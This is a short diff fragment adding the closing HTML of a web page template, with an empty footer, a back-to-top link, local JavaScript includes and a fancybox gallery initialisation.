+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
